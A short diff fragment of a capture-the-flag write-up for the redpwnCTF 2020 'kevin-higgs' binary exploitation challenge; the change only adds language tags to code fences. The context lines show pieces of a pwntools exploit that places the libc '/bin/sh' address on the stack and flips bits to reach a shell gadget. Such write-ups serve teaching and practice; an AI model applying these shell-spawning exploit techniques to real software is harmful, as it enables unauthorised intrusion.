@@ -572,7 +572,7 @@ write(next(libc.search(b'/bin/sh')),esp+(offset-20)+8)
 
 ### Get a shell, get the flag
 
-```
+```python
 # one way exit
 log.info('"exit" loop to shell')
 flipbit(maxflips,31)
@@ -584,7 +584,7 @@ After all that, just flip off `maxflips` to call `exit` to call the gadget, that
 
 Output:
 
-```
+```bash
 # time ./exploit.py
 [*] '/pwd/datajerk/redpwnctf2020/kevin-higgs/kevin-higgs'
     Arch:     i386-32-little
